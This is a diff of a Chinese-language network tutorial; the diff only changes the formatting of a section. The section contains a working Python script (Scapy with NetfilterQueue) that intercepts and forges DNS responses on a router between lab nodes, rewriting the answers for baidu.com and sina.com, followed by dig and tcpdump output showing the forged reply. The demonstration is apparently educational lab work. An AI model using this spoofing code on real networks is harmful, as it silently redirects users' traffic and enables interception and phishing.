@@ -100,89 +100,93 @@ Node2 作为中间路由器, 需要打开 `ipv4_forward`, 并在 Node1 和 Node3
 [Scapy](https://scapy.readthedocs.io/en/latest/) 可以方便我们构造和修改报文，
 `scapy.IP(pkt.get_payload())` 将二进制数据 转换成 `scapy.IP` 对象
 
+~~~ python
 
-    root@node2:/# cat dns_ans_spoof.py 
+import scapy.all as scapy
+from netfilterqueue import NetfilterQueue
+    
+# 只修改此 DNS Server的响应
 
-    import scapy.all as scapy
-    from netfilterqueue import NetfilterQueue
-    
-    # 只修改此 DNS Server的响应
-    target_dns_servers = ['192.168.129.113']
-    # 将 www.baidu.com 的域名解析修改为 1.1.1.1
-    target_domains = {
-       'www.baidu.com.': '1.1.1.1',
-       'www.sina.com.': '2.2.2.2'
-    }
-    target_domains_set = target_domains.keys()
-    
-    def dns_spoof_and_accept(pkt):
-        try:
-            dns_packet = scapy.IP(pkt.get_payload())
-            dns_server_ip = dns_packet[scapy.IP].src
-            # 源地址匹配，并且有 RR 记录
-            if dns_server_ip in target_dns_servers and dns_packet.haslayer(scapy.DNSRR):
-                qname = dns_packet[scapy.DNSQR].qname 
-                if qname in target_domains_set:
-                    dns_response = scapy.DNSRR(rrname=qname, rdata=target_domains[qname])
-                    dns_packet[scapy.DNS].an = dns_response
-                    dns_packet[scapy.DNS].ancount = 1
-                    # 删除Checksum 
-                    del dns_packet[scapy.IP].len
-                    del dns_packet[scapy.IP].chksum
-                    del dns_packet[scapy.UDP].len
-                    del dns_packet[scapy.UDP].chksum
-                    pkt.set_payload(str(dns_packet))
-        except Exception as e:
-            pass
-        finally:
-            pkt.accept()
-    
-    nfqueue = NetfilterQueue()
-    # 满足条件的 pkt 会进入此 nfqueue, 交给 dns_spoof_and_accept(pkt) 来处理
-    nfqueue.bind(0, dns_spoof_and_accept)
+target_dns_servers = ['192.168.129.113']
+
+# 将 www.baidu.com 的域名解析修改为 1.1.1.1
+
+target_domains = {
+    'www.baidu.com.': '1.1.1.1',
+    'www.sina.com.': '2.2.2.2'
+}
+target_domains_set = target_domains.keys()
+
+def dns_spoof_and_accept(pkt):
     try:
-        nfqueue.run()
-    except KeyboardInterrupt:
-        print('Exit')
-    
-    nfqueue.unbind()
+        dns_packet = scapy.IP(pkt.get_payload())
+        dns_server_ip = dns_packet[scapy.IP].src
+        # 源地址匹配，并且有 RR 记录
 
+        if dns_server_ip in target_dns_servers and dns_packet.haslayer(scapy.DNSRR):
+            qname = dns_packet[scapy.DNSQR].qname 
+            if qname in target_domains_set:
+                dns_response = scapy.DNSRR(rrname=qname, rdata=target_domains[qname])
+                dns_packet[scapy.DNS].an = dns_response
+                dns_packet[scapy.DNS].ancount = 1
+                # 删除Checksum 
 
+                del dns_packet[scapy.IP].len
+                del dns_packet[scapy.IP].chksum
+                del dns_packet[scapy.UDP].len
+                del dns_packet[scapy.UDP].chksum
+                pkt.set_payload(str(dns_packet))
+    except Exception as e:
+        pass
+    finally:
+        pkt.accept()
+
+nfqueue = NetfilterQueue()
+# 满足条件的 pkt 会进入此 nfqueue, 交给 dns_spoof_and_accept(pkt) 来处理
+
+nfqueue.bind(0, dns_spoof_and_accept)
+try:
+    nfqueue.run()
+except KeyboardInterrupt:
+    print('Exit')
+
+nfqueue.unbind()
+~~~ 
 
 运行 `dns_ans_spoof.py`, 然后再次在 node1 上请求 dns 解析
 
 
-    # 百度的地址已经被修改为了 1.1.1.1, 其他未配置的请求不会被修改
-    root@node1:/# dig www.baidu.com @192.168.129.113 
+~~~ 
+# 百度的地址已经被修改为了 1.1.1.1, 其他未配置的请求不会被修改
 
-    ; <<>> DiG 9.11.3-1ubuntu1.5-Ubuntu <<>> www.baidu.com @192.168.129.113
-    ;; global options: +cmd
-    ;; Got answer:
-    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23488
-    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
-    
-    ;; OPT PSEUDOSECTION:
-    ; EDNS: version: 0, flags:; udp: 4096
-    ;; QUESTION SECTION:
-    ;www.baidu.com.			IN	A
-    
-    ;; ANSWER SECTION:
-    www.baidu.com.		0	IN	A	1.1.1.1
-    
-    ;; Query time: 83 msec
-    ;; SERVER: 192.168.129.113#53(192.168.129.113)
-    ;; WHEN: Mon Mar 11 17:07:56 CST 2019
-    ;; MSG SIZE  rcvd: 71
+root@node1:/# dig www.baidu.com @192.168.129.113 
 
+; <<>> DiG 9.11.3-1ubuntu1.5-Ubuntu <<>> www.baidu.com @192.168.129.113
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23488
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
 
-    # 查看 node2 上的抓包信息 
-    09:07:56.433256 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
-    09:07:56.433479 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
-    # Original DNS Resp
-    09:07:56.442586 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 3/0/1 CNAME www.a.shifen.com., A 115.239.211.112, A 115.239.210.27 (101)
-    # Modified DNS Resp
-    09:07:56.515473 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 1/0/1 A 1.1.1.1 (71)
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;www.baidu.com.			IN	A
 
+;; ANSWER SECTION:
+www.baidu.com.		0	IN	A	1.1.1.1
+
+;; Query time: 83 msec
+;; SERVER: 192.168.129.113#53(192.168.129.113)
+;; WHEN: Mon Mar 11 17:07:56 CST 2019
+;; MSG SIZE  rcvd: 71
+# 查看 node2 上的抓包信息 
+09:07:56.433256 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
+09:07:56.433479 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
+# Original DNS Resp
+09:07:56.442586 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 3/0/1 CNAME www.a.shifen.com., A 115.239.211.112, A 115.239.210.27 (101)
+# Modified DNS Resp
+09:07:56.515473 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 1/0/1 A 1.1.1.1 (71)
+~~~
 
 #### 0x04 Reference
 
